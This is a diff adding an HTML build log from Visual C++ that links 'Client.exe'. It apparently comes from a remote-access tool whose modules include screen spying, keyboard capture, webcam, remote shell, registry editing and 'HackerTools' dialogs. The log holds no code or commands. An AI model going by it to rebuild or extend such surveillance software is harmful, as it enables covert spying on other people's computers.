@@ -1,0 +1,82 @@
+<html>
+<body>
+<pre>
+<h1>Build Log</h1>
+<h3>
+--------------------Configuration: Client - Win32 Release--------------------
+</h3>
+<h3>Command Lines</h3>
+Creating temporary file "C:\Users\ADMINI~1\AppData\Local\Temp\RSP2073.tmp" with contents
+[
+..\common\libxvidcore.lib ..\common\va_g729a.lib vfw32.lib nafxcw.lib LIBCMT.lib /nologo /subsystem:windows /incremental:no /pdb:"Release/Client.pdb" /machine:I386 /out:"..\Bin\Client.exe" 
+.\Release\Audio.obj
+.\Release\AudioDlg.obj
+.\Release\BmpToAvi.obj
+.\Release\Buffer.obj
+.\Release\BuildDlg.obj
+.\Release\ChangeGroupDlg.obj
+.\Release\ChromeDlg.obj
+.\Release\Client.obj
+.\Release\ClientDoc.obj
+.\Release\ClientView.obj
+.\Release\Dec.obj
+.\Release\Dib.obj
+.\Release\FileAttr.obj
+.\Release\FileManagerDlg.obj
+.\Release\FileTransferModeDlg.obj
+.\Release\HackerTools.obj
+.\Release\HtmlCtrl.obj
+.\Release\Icons.obj
+.\Release\IniFile.obj
+.\Release\InputDlg.obj
+.\Release\IOCPServer.obj
+.\Release\KeyBoardDlg.obj
+.\Release\LFileName.obj
+.\Release\LocalUpload.obj
+.\Release\LOGIN.obj
+.\Release\LogView.obj
+.\Release\MainFrm.obj
+.\Release\MapDlg.obj
+.\Release\MD5.OBJ
+.\Release\MsgBoxDlg.obj
+.\Release\MyChat.obj
+.\Release\MyToolsKit.obj
+.\Release\OpenProxy.obj
+.\Release\PcView.obj
+.\Release\PictureEx.obj
+.\Release\Play.obj
+.\Release\PrankDlg.obj
+.\Release\ProxyMapDlg.obj
+.\Release\RegeditDlg.obj
+.\Release\RegeditTextDlg.obj
+.\Release\ScreenSpyDlg.obj
+.\Release\ScreenSpyDlgs.obj
+.\Release\ServiceDlg.obj
+.\Release\ServiceInfoDlg.obj
+.\Release\SettingDlg.obj
+.\Release\SEU_QQwry.obj
+.\Release\ShellDlg.obj
+.\Release\ShowWave.obj
+.\Release\SortListCtrl.obj
+.\Release\SoundToWav.obj
+.\Release\Start.obj
+.\Release\StdAfx.obj
+.\Release\SystemDlg.obj
+.\Release\TextChatDlg.obj
+.\Release\TrueColorToolBar.obj
+.\Release\UACYXDlg.obj
+.\Release\WebCamDlg.obj
+.\Release\XvidDec.obj
+.\Release\Client.res
+]
+Creating command line "link.exe @C:\Users\ADMINI~1\AppData\Local\Temp\RSP2073.tmp"
+<h3>Output Window</h3>
+Linking...
+
+
+
+<h3>Results</h3>
+Client.exe - 0 error(s), 0 warning(s)
+</pre>
+</body>
+</html>
